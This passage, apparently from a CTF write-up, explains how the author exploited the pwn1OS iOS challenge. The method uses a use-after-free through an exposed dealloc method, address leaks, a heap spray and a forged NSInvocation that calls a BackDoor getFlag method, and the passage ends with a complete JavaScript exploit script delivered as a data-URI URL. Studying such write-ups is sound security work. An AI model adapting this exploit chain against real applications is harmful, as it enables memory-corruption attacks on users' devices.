<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ScriptInterface</span> : <span class="title">NSObject</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">CoreService</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">N1CTFIntroduction</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">HTTRequest</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure>
<p>And an instance of <code>ScriptInterface</code> is explosed to the context of JavaScript</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v11 = objc_msgSend_new(&amp;OBJC_CLASS___ScriptInterface, v18);</span><br><span class="line">objc_msgSend_setValue_forKey_(v10, v18);</span><br><span class="line">objc_release(v11);</span><br></pre></td></tr></table></figure>
<p>All these are the subclass of <code>ScriptInterface</code>. So we can call their methods in the context of JavaScript.</p>
<p>Also</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ (_Bool)isSelectorExcludedFromWebScript:(SEL)arg1;</span><br></pre></td></tr></table></figure>
<p>always returns <code>NO</code>, which means all the methods are exposed to JavaScript. Considering the following code:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = n1ctf.$makeCoreService();</span><br><span class="line"><span class="built_in">window</span>.a = a;</span><br><span class="line">a.dealloc();</span><br></pre></td></tr></table></figure>
<p>We can see that the <code>dealloc</code> method is exposed to JavaScript. So we can call <code>dealloc</code> on any object to free it. This is a very powerful primitive that let us use after free any <code>ScriptInterface</code> and subclass object.</p>
<p>In <code>-[CoreService dealloc]</code>, it will call <code>-[NSInvocation invoke]</code> on its property <code>@property NSInvocation * cancelRequest;</code>. So we can craft a fake <code>NSInvocation</code> object to call any method on any object. For example, <code>+[BackDoor getFlag:]</code>. (Actually in a challenge designed by me for my undergraduate school’s CTF, there is a similar technique, e.g. using <code>NSInvocation</code> to call arbitrary C functions`)</p>
<p>To build up the <code>addrof()</code> primitive, we can make use of the error message when calling a non-exist method on and object. I took the implementation from CodeColorist’s writeup for CVE-2021-1748</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copy from CVE-2021-1784</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    n1ctf.$setChallenge_(obj)</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        n1ctf.$challenge()</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.debug(e)</span><br><span class="line">        <span class="keyword">const</span> match = <span class="regexp">/instance (0x[\da-f]+)$/i</span>.exec(e)</span><br><span class="line">        <span class="keyword">if</span> (match) <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Failed&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Another challenge is how to do the heap spray. Luckily we have a method</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">HTTRequest</span> : <span class="title">ScriptInterface</span></span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSData</span> *_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="keyword">void</span>).cxx_destruct;</span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">retain</span>, <span class="keyword">nonatomic</span>) <span class="built_in">NSData</span> *data; <span class="comment">// @synthesize data=_data;</span></span><br><span class="line">- (<span class="keyword">void</span>)describeObject:(<span class="keyword">id</span>)arg1:(<span class="keyword">id</span>)arg2;</span><br><span class="line">- (<span class="keyword">void</span>)addMultiPartData:(<span class="keyword">id</span>)arg1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure>
<p><code>-[HTTRequest addMultiPartData:]</code> takes a base64 encoded string as input, and decodes it to store in <code>NSData *_data</code>. So we can use this method to do heap spray.</p>
<h2 id="Exploit">Exploit</h2>
<p>So the exploitation looks like this:</p>
<ul>
<li>Free a <code>CoreService</code> object</li>
<li>Reallocate it and perform a type confusion, convert it to a <code>NSConcreteData</code> object to do memory disclosure</li>
<li>Leak dyld_shared_cache, pwn1OS base address, tagged <code>NSMethodSignature</code> address and <code>cookie</code></li>
<li>Set up the arguments for <code>+[BackDoor getFlag:]</code></li>
<li>Craft fake <code>NSInvocation</code> object to call <code>+[BackDoor getFlag:]</code></li>
</ul>
<h2 id="Script">Script</h2>
<p>I have no idea about how to write elegant JavaScript so don’t blame me.<br>
The full payload generated script is here:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.toDataURI = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;data:text/html;,&#x27;</span> + <span class="built_in">encodeURIComponent</span>(<span class="built_in">this</span>).replace(<span class="regexp">/[!&#x27;()*]/g</span>, <span class="built_in">escape</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0x2834c99a0: 0x02000001f9e2a699 0x0000000102c29f20 &lt;- isa, frame:0x0000000102c29f20 -&gt; [target, selector, arguments]</span></span><br><span class="line"><span class="comment">0x2834c99b0: 0x0000000102c29de0 0xbd0461d930d9b4a7 &lt;- retdata, signature</span></span><br><span class="line"><span class="comment">0x2834c99c0: 0x0000000000000000 0x0000000000000000 &lt;- wtf, 0</span></span><br><span class="line"><span class="comment">0x2834c99d0: 0x00000002819a39f0 0x00000001e60e9a43 &lt;- target, selector</span></span><br><span class="line"><span class="comment">0x2834c99e0: 0x00000000a50e01d3 0x0000000000000000 &lt;- _magic_cookie.ovalue, 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hexToBase64</span>(<span class="params">hexstring</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> btoa(hexstring.match(<span class="regexp">/\w&#123;2&#125;/g</span>).map(<span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(<span class="built_in">parseInt</span>(a, <span class="number">16</span>));</span><br><span class="line">        &#125;).join(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// data is a number</span></span><br><span class="line">        data = <span class="built_in">BigInt</span>(data)</span><br><span class="line">        str_data = data.toString(<span class="number">16</span>);</span><br><span class="line">        <span class="comment">// pad to 8 bytes</span></span><br><span class="line">        str_data = str_data.padStart(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        <span class="comment">// reverse bytes order</span></span><br><span class="line">        str_data = str_data.match(<span class="regexp">/\w&#123;2&#125;/g</span>).reverse().join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> str_data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> offsets = &#123;</span><br><span class="line">        <span class="comment">// remember to change all of this!</span></span><br><span class="line">        <span class="attr">base_address</span>:           <span class="number">0x0000000100000000</span>,</span><br><span class="line">        <span class="attr">corefoundation_base</span>:    <span class="number">0x0000000180329000</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSArrayI_Class</span>:         <span class="number">0x00000001DE53ABF8</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSInvocation_Class</span>:     <span class="number">0x00000001de53a658</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSBooleanFalse</span>:         <span class="number">0x00000001da63a0b8</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSData_Class</span>:           <span class="number">0x00000001DE3719C8</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">NSConcreteData_Class</span>:   <span class="number">0x00000001de542370</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">foundation_corefoundation_offset</span>:<span class="number">0x1311000</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">foundation_base</span>:        <span class="number">0x000000018163A000</span>,    <span class="comment">// done</span></span><br><span class="line">        <span class="attr">HTTRequest_Class</span>:       <span class="number">0x0000000100013300</span>,</span><br><span class="line">        <span class="attr">CoreService_Class</span>:      <span class="number">0x0000000100013238</span>,</span><br><span class="line">        <span class="attr">BackDoor_Class</span>:         <span class="number">0x0000000100013120</span>,</span><br><span class="line">        <span class="attr">getFlag_SEL</span>:            <span class="number">0x000000010000D99B</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy from CVE-2021-1784</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        n1ctf.$setChallenge_(obj)</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            n1ctf.$challenge()</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="built_in">console</span>.debug(e)</span><br><span class="line">            <span class="keyword">const</span> match = <span class="regexp">/instance (0x[\da-f]+)$/i</span>.exec(e)</span><br><span class="line">            <span class="keyword">if</span> (match) <span class="keyword">return</span> match[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Failed&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">process_leak_data</span>(<span class="params">leak</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// find &#x27;bytes = &#x27; in leak_data, get all bytes after it, remove the last &#x27;&#125;&#x27;</span></span><br><span class="line">        leak = leak.split(<span class="string">&#x27;bytes = &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&#125;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">// remove the first 0x</span></span><br><span class="line">        leak = leak.slice(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// the leak is 24 bytes, split to 3 parts, each 8 bytes</span></span><br><span class="line">        leak = leak.match(<span class="regexp">/\w&#123;16&#125;/g</span>);</span><br><span class="line">        <span class="comment">// for each part, reverse the bytes order</span></span><br><span class="line">        leak = leak.map(<span class="function"><span class="params">x</span> =&gt;</span> x.match(<span class="regexp">/\w&#123;2&#125;/g</span>).reverse().join(<span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="comment">// convert to number</span></span><br><span class="line">        leak = leak.map(<span class="function"><span class="params">x</span> =&gt;</span> <span class="built_in">BigInt</span>(<span class="string">&quot;0x&quot;</span> + x, <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c1 = n1ctf.$makeCoreService()</span><br><span class="line">    <span class="built_in">window</span>.c1 = c1;</span><br><span class="line">    <span class="built_in">window</span>.data_array = [];</span><br><span class="line"></span><br><span class="line">    corefoundation_addr = addrof(<span class="literal">false</span>)</span><br><span class="line">    n1ctf.$DEBUGLOG_(corefoundation_addr);</span><br><span class="line"></span><br><span class="line">    corefoundation_addr = <span class="built_in">parseInt</span>(corefoundation_addr, <span class="number">16</span>)</span><br><span class="line">    corefoundation_addr -= offsets.NSBooleanFalse;</span><br><span class="line">    corefoundation_slide = corefoundation_addr;</span><br><span class="line">    corefoundation_addr += offsets.corefoundation_base;</span><br><span class="line">    foundation_addr = corefoundation_addr + offsets.foundation_corefoundation_offset;</span><br><span class="line">    foundation_slide = foundation_addr - offsets.foundation_base;</span><br><span class="line">    <span class="comment">// to hex</span></span><br><span class="line">    coreservice = n1ctf.$makeCoreService();</span><br><span class="line"></span><br><span class="line">    coreservice_addr = addrof(coreservice)</span><br><span class="line">    n1ctf.$DEBUGLOG_(coreservice_addr);</span><br><span class="line">    coreservice_addr = <span class="built_in">parseInt</span>(coreservice_addr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make HTTRequest</span></span><br><span class="line">    req = n1ctf.$makeHTTRequest();</span><br><span class="line"></span><br><span class="line">    req_addr = addrof(req);</span><br><span class="line">    req_addr = <span class="built_in">parseInt</span>(req_addr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    c1_addr = addrof(c1);</span><br><span class="line">    c1_addr = <span class="built_in">parseInt</span>(c1_addr, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// craft payload</span></span><br><span class="line">    <span class="comment">// leak isa and cancelRequest of c1</span></span><br><span class="line">    dt = p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>) +</span><br><span class="line">         p64(c1_addr) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// save coreservice</span></span><br><span class="line">    <span class="built_in">window</span>.coreservice = coreservice;</span><br><span class="line">    coreservice.dealloc();    <span class="comment">// use-after-free</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// base64</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(dt));</span><br><span class="line">        <span class="built_in">window</span>.data_array.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line">    n1ctf.$describeObject__(coreservice);</span><br><span class="line">    leak_data = <span class="string">`<span class="subst">$&#123;coreservice&#125;</span>`</span></span><br><span class="line"></span><br><span class="line">    leak_data = process_leak_data(leak_data);</span><br><span class="line">    <span class="comment">// calculate the base address of pwn1OS</span></span><br><span class="line">    pwn1OS_base = leak_data[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFFFFFFn</span>;</span><br><span class="line">    pwn1OS_base -= (<span class="built_in">BigInt</span>(offsets.CoreService_Class) + <span class="number">1n</span>);</span><br><span class="line">    pwn1OS_base += <span class="number">0x0000000100000000n</span>;</span><br><span class="line"></span><br><span class="line">    c1_invocation_addr = addrof(c1.$cancelRequest());</span><br><span class="line">    c1_invocation_addr = <span class="built_in">parseInt</span>(c1_invocation_addr, <span class="number">16</span>);</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;target: &quot;</span> + c1_invocation_addr.toString(<span class="number">16</span>));</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;fake NSConcreteData: &quot;</span> + addrof(<span class="built_in">window</span>.coreservice));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// craft payload</span></span><br><span class="line">    <span class="comment">// leak the tagged NSMethodSignature</span></span><br><span class="line">    dt = p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>) +</span><br><span class="line">         p64(c1_invocation_addr + <span class="number">0x18</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    coreservice.dealloc();    <span class="comment">// use-after-free</span></span><br><span class="line">    <span class="built_in">window</span>.data_array = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(dt));</span><br><span class="line">        <span class="built_in">window</span>.data_array.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    leak_data = <span class="string">`<span class="subst">$&#123;coreservice&#125;</span>`</span></span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;leak tagged NSMethodSignature&quot;</span>);</span><br><span class="line">    leak_data = process_leak_data(leak_data);</span><br><span class="line">    tagged_NSMethodSignature = leak_data[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    c2 = n1ctf.$makeCoreService();</span><br><span class="line">    <span class="built_in">window</span>.c2 = c2;</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;target: &quot;</span> + c1_invocation_addr.toString(<span class="number">16</span>));</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;fake NSConcreteData: &quot;</span> + addrof(<span class="built_in">window</span>.c2));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// craft payload, leak the cookie</span></span><br><span class="line">    dt = p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>) +</span><br><span class="line">        p64(c1_invocation_addr + <span class="number">0x30</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">        p64(foundation_slide + offsets.NSConcreteData_Class) + p64(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">    n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    c2.dealloc();</span><br><span class="line">    <span class="built_in">window</span>.data_array2 = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(dt));</span><br><span class="line">        <span class="built_in">window</span>.data_array2.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    introduction1 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    leak_data = <span class="string">`<span class="subst">$&#123;c2&#125;</span>`</span></span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;leak cookie&quot;</span>);</span><br><span class="line">    leak_data = process_leak_data(leak_data);</span><br><span class="line">    cookie = leak_data[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.introduction1 = introduction1;</span><br><span class="line">    introduction1_addr = addrof(introduction1);</span><br><span class="line">    introduction1_addr = <span class="built_in">parseInt</span>(introduction1_addr, <span class="number">16</span>);</span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;introduction1_addr: &quot;</span> + introduction1_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">window</span>.data_array3 = [];</span><br><span class="line">    <span class="built_in">window</span>.c1.$setCancelRequest_(<span class="built_in">window</span>.introduction1);</span><br><span class="line"></span><br><span class="line">    n1i1 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    n1i2 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line">    n1i3 = n1ctf.$makeN1CTFIntroduction();</span><br><span class="line"></span><br><span class="line">    n1i1.setP_(<span class="string">&quot;http://aaa.aaa.aaa.aaa:aaaaa///pleasegivemetheflag&quot;</span>);</span><br><span class="line">    addrof_p = addrof(n1i1.p());</span><br><span class="line"></span><br><span class="line">    n1i2.dealloc();</span><br><span class="line">    n1i3.dealloc();</span><br><span class="line"></span><br><span class="line">    n1ctf.$DEBUGLOG_(<span class="string">&quot;spray fake NSInvocation&quot;</span>);</span><br><span class="line">    <span class="comment">// craft payload</span></span><br><span class="line">    fake_invok = p64(corefoundation_slide + offsets.NSInvocation_Class) + p64(introduction1_addr +<span class="number">0x50</span>) +</span><br><span class="line">         p64(introduction1_addr + <span class="number">0x80</span>) + p64(tagged_NSMethodSignature) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.BackDoor_Class)) + p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.getFlag_SEL)) +</span><br><span class="line">         p64(cookie) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.BackDoor_Class)) + p64(pwn1OS_base-<span class="built_in">BigInt</span>(offsets.base_address)+<span class="built_in">BigInt</span>(offsets.getFlag_SEL)) +</span><br><span class="line">         p64(addrof_p) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>) +</span><br><span class="line">         p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    introduction1.$dealloc();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++) &#123;</span><br><span class="line">        req.addMultiPartData_(hexToBase64(fake_invok))</span><br><span class="line">        <span class="built_in">window</span>.data_array3.push(req.data());</span><br><span class="line">    &#125;</span><br><span class="line">    n1ctf.$describeObject__(introduction1);</span><br><span class="line">    c1.dealloc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">`&lt;script type=&quot;application/javascript&quot;&gt;(<span class="subst">$&#123;payload&#125;</span>)()&lt;/script&gt;`</span>.toDataURI()</span><br><span class="line">url = <span class="keyword">new</span> URL(<span class="string">&#x27;n1ctf://web/fyou?url=fme&#x27;</span>)</span><br><span class="line">url.searchParams.set(<span class="string">&#x27;url&#x27;</span>, data);</span><br><span class="line">url.toString()</span><br><span class="line"><span class="built_in">console</span>.log(url.toString())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
      <!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Home</title>
